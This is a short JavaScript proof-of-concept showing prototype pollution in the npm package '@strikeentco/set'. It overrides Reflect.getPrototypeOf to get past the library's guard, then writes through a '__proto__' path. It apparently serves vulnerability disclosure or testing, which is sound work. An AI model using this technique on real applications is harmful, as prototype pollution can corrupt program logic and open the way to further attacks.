Reflect.getPrototypeOf = () => false;
const sset = require('@strikeentco/set');
var obj = {};
console.log({}.polluted);
sset(obj, '__proto__.polluted', 'yes');
console.log('{ ' + obj.polluted + ', ' + 'yes' + ' }');